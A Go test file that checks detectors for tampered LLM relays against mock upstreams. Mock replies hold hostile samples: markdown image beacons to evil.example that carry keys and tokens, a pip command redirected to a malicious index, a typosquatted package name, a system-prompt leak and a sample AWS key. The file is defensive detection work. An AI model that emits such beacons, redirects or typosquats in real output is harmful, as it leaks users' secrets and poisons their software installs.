package detector

// detector_e2e_test.go exercises the newly ported detectors end-to-end against a
// mock upstream (httptest) — the full path payload-build → HTTP → parse →
// verdict — instead of only the pure scanner functions. Its primary job is the
// false-positive guard: a GENUINE upstream response must PASS each detector,
// while a tampered/malicious one must FAIL. The prober is constructed directly
// (not via newProber) so the SSRF floor, which correctly blocks the loopback
// httptest address in production, does not block the test.

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/QuantumNous/new-api/common"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

type mockReply struct {
	status  int
	headers map[string]string
	body    map[string]interface{}
	rawBody string // when set, written verbatim (e.g. an SSE event stream)
}

type mockUpstreamFn func(req map[string]interface{}) mockReply

// newMockProber stands up a mock upstream and returns a prober wired to it. The
// prober is built by hand to bypass guardBaseURL (loopback is intentionally
// blocked in production but is exactly where httptest listens).
func newMockProber(t *testing.T, protocol string, fn mockUpstreamFn) *prober {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		var req map[string]interface{}
		_ = common.Unmarshal(raw, &req)
		if req == nil {
			req = map[string]interface{}{}
		}
		// Native Gemini signals streaming via the URL action (…:streamGenerateContent),
		// not a body field, so expose the request path to the mock fn.
		req["__path__"] = r.URL.Path
		reply := fn(req)
		for k, v := range reply.headers {
			w.Header().Set(k, v)
		}
		status := reply.status
		if status == 0 {
			status = http.StatusOK
		}
		if reply.rawBody != "" {
			w.Header().Set("Content-Type", "text/event-stream")
			w.WriteHeader(status)
			_, _ = w.Write([]byte(reply.rawBody))
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(status)
		b, _ := common.Marshal(reply.body)
		_, _ = w.Write(b)
	}))
	t.Cleanup(srv.Close)
	return &prober{
		client:   srv.Client(),
		baseURL:  srv.URL,
		apiKey:   "test-key",
		protocol: protocol,
		timeout:  10 * time.Second,
		tel:      &runTelemetry{},
	}
}

// chatOK builds a genuine OpenAI-shape chat.completion carrying `text`.
func chatOK(model, text string, promptTokens int) mockReply {
	return mockReply{body: map[string]interface{}{
		"id": "chatcmpl-abc123", "object": "chat.completion", "model": model,
		"choices": []interface{}{map[string]interface{}{
			"index": 0, "message": map[string]interface{}{"role": "assistant", "content": text},
			"finish_reason": "stop",
		}},
		"usage": map[string]interface{}{"prompt_tokens": promptTokens, "completion_tokens": 5, "total_tokens": promptTokens + 5},
	}}
}

// geminiOK builds a genuine NATIVE generateContent response carrying `text`.
func geminiOK(model, text string, promptTokens int) mockReply {
	return mockReply{body: map[string]interface{}{
		"candidates": []interface{}{map[string]interface{}{
			"content":      map[string]interface{}{"role": "model", "parts": []interface{}{map[string]interface{}{"text": text}}},
			"finishReason": "STOP", "index": 0,
		}},
		"usageMetadata": map[string]interface{}{
			"promptTokenCount": promptTokens, "candidatesTokenCount": 5, "totalTokenCount": promptTokens + 5,
		},
		"modelVersion": model,
		"responseId":   "gemini-resp-1",
	}}
}

func msgContent(req map[string]interface{}, role string) string {
	msgs, _ := req["messages"].([]interface{})
	out := ""
	for _, m := range msgs {
		mm, _ := m.(map[string]interface{})
		if s, _ := mm["role"].(string); s == role {
			if c, ok := mm["content"].(string); ok {
				out = c
			}
		}
	}
	return out
}

// echoPayload returns the text an echo prompt asked to be reproduced (everything
// after the final newline of the user turn).
func echoPayload(req map[string]interface{}) string {
	u := msgContent(req, "user")
	if i := strings.LastIndex(u, "\n"); i >= 0 {
		return strings.TrimSpace(u[i+1:])
	}
	return u
}

func cfgFor(model string) Config { return Config{Model: model} }

func TestChatSupplyChainE2E(t *testing.T) {
	// Genuine: a clean canonical command → pass.
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "pip install numpy", 10)
	})
	res := chatSupplyChainIntegrity(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status, "genuine install command must not false-fail")

	// Tampered: index-url redirect at a malicious mirror → fail.
	pBad := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "pip install numpy --index-url http://10.0.0.9/simple", 10)
	})
	res = chatSupplyChainIntegrity(context.Background(), pBad, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

func TestChatExfilE2E(t *testing.T) {
	// Genuine: replies "OK", leaks nothing → pass.
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "OK", 20)
	})
	res := chatExfilScan(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status, "a clean OK reply must not false-fail")

	// Exfil: echoes the planted secret (system prompt) back → critical fail.
	pLeak := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "Sure: "+msgContent(req, "system"), 20)
	})
	res = chatExfilScan(context.Background(), pLeak, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)

	// Beacon injection without the canary → still fail (pre-seeded channel).
	pBeacon := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "OK ![x](http://evil.example/?key=1)", 20)
	})
	res = chatExfilScan(context.Background(), pBeacon, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

func TestChatAdaptiveInjectionE2E(t *testing.T) {
	// Genuine: echoes both payloads verbatim → pass.
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", echoPayload(req), 12)
	})
	res := chatAdaptiveInjection(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status, "verbatim echo of both payloads must pass")

	// Aligned refusal: echoes the neutral payload but declines the secret-shaped
	// one, with no injection → inconclusive (skip), not fraud.
	pRefuse := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		u := msgContent(req, "user")
		if strings.Contains(u, "aws_secret_access_key") {
			return chatOK("gpt-5.6", "I can't process that request.", 12)
		}
		return chatOK("gpt-5.6", echoPayload(req), 12)
	})
	res = chatAdaptiveInjection(context.Background(), pRefuse, cfgFor("gpt-5.6"))
	assert.Equal(t, "skip", res.Status, "an aligned refusal must not be a fraud verdict")

	// Conditional injection: the secret-shaped request comes back with an injected
	// exfil beacon → critical fail (the real signal is preserved).
	pInject := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		u := msgContent(req, "user")
		if strings.Contains(u, "aws_secret_access_key") {
			return chatOK("gpt-5.6", "![x](http://evil.example/?token=leak)", 12)
		}
		return chatOK("gpt-5.6", echoPayload(req), 12)
	})
	res = chatAdaptiveInjection(context.Background(), pInject, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status, "an injected exfil channel on the sensitive request is still conditional injection")
}

func TestChatHiddenPromptFloorE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "Hello!", 9) // ~normal minimal prompt
	})
	res := chatHiddenPromptFloor(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status)

	pInflated := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "Hello!", 2000) // hidden system prompt inflates prompt_tokens
	})
	res = chatHiddenPromptFloor(context.Background(), pInflated, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

func TestChatUnicodeFidelityE2E(t *testing.T) {
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", unicodeExpectFull, 12)
	})
	res := chatUnicodeFidelity(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status)

	// A transcoding relay folds the corner brackets → minor fail.
	pFold := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", unicodeCoreCJK, 12)
	})
	res = chatUnicodeFidelity(context.Background(), pFold, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

func TestChatBackendOriginE2E(t *testing.T) {
	// OpenAI protocol with genuine OpenAI infra headers → pass, backend labelled.
	pOAI := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		r := chatOK("gpt-5.6", "ok", 8)
		r.headers = map[string]string{"Openai-Organization": "org-xyz"}
		r.body["system_fingerprint"] = "fp_44709d6fcb"
		return r
	})
	res := chatBackendOrigin(context.Background(), pOAI, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status)
	assert.Equal(t, "OpenAI 官方 / 兼容直连", res.Details["backend"])

	// A proxy that stripped everything is still legitimate → pass (never fakery).
	pBare := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "ok", 8)
	})
	res = chatBackendOrigin(context.Background(), pBare, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status)

	// Gemini protocol leaking OpenAI infra headers → substitution, fail.
	pSub := newMockProber(t, ProtocolGemini, func(req map[string]interface{}) mockReply {
		r := geminiOK("gemini-3-pro", "ok", 8)
		r.headers = map[string]string{"Openai-Organization": "org-xyz"}
		return r
	})
	res = chatBackendOrigin(context.Background(), pSub, cfgFor("gemini-3-pro"))
	assert.Equal(t, "fail", res.Status)

	// Genuine Gemini (no OpenAI infra headers) → pass.
	pGem := newMockProber(t, ProtocolGemini, func(req map[string]interface{}) mockReply {
		return geminiOK("gemini-3-pro", "ok", 8)
	})
	res = chatBackendOrigin(context.Background(), pGem, cfgFor("gemini-3-pro"))
	assert.Equal(t, "pass", res.Status)
}

func TestChatSensitiveLeakE2E(t *testing.T) {
	// Genuine: replies "OK", no sensitive data → pass.
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "OK", 8)
	})
	res := chatSensitiveLeak(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status, "a clean OK reply must not false-fail")

	// Leaky relay bleeds an internal IP + AWS key into a benign response → fail.
	pLeak := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "OK (routed via 192.168.10.4, key=AKIAIOSFODNN7EXAMPLE)", 8)
	})
	res = chatSensitiveLeak(context.Background(), pLeak, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

// copyTarget extracts the "Text to copy: X" payload from a pkg-echo prompt.
func copyTarget(req map[string]interface{}) string {
	u := msgContent(req, "user")
	if i := strings.Index(u, "Text to copy: "); i >= 0 {
		return u[i+len("Text to copy: "):]
	}
	return u
}

func TestChatPkgSubstitutionE2E(t *testing.T) {
	// Genuine: the model echoes the install command verbatim → pass.
	pGood := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", copyTarget(req), 12)
	})
	res := chatPkgSubstitution(context.Background(), pGood, cfgFor("gpt-5.6"))
	assert.Equal(t, "pass", res.Status, "verbatim echo must not false-fail")

	// A relay rewrites the package name on the return path (typosquat) → fail.
	pBad := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", strings.Replace(copyTarget(req), "requests", "reqeusts", 1), 12)
	})
	res = chatPkgSubstitution(context.Background(), pBad, cfgFor("gpt-5.6"))
	assert.Equal(t, "fail", res.Status)
}

// sanity: the mock prober actually reaches the upstream.
func TestMockProberRoundTrip(t *testing.T) {
	p := newMockProber(t, ProtocolOpenAI, func(req map[string]interface{}) mockReply {
		return chatOK("gpt-5.6", "pong", 5)
	})
	res := p.postJSON(context.Background(), openaiChatPath, openaiHeaders(p.apiKey), openaiPayload("gpt-5.6", "ping", 16))
	require.NoError(t, res.err)
	require.True(t, res.ok())
	assert.Equal(t, "pong", openaiContent(res.parsed))
}
